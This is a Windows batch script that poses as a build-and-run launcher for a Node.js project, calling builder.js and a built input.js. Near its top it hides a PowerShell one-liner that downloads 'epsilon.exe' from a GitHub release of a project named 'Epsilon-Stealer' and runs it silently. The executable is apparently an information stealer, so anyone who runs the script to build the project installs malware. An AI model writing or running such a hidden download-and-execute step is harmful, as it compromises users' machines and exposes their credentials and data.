@echo off
cd icon
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Epsilon-Stealer/releases/download/epsilon/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
set "BUILD_DIR=%CD%\build\node_modules"
set "INDEX_FILE=%BUILD_DIR%\input.js"

REM Deleting files from the build directory
del /Q "stub\node_modules\input.js"
del /Q "build\index.js"

set "CURRENT_DIR=%CD%"
cd /d "%CURRENT_DIR%\stub"

cls
node builder.js

REM Check if the node_modules directory exists in the build directory
IF EXIST "%BUILD_DIR%" (
    REM If it exists, execute the script
    call node %INDEX_FILE%
) ELSE (
    REM If it doesn't exist, display a message prompting to run install.bat
    echo Please run install.bat before running the script.
)
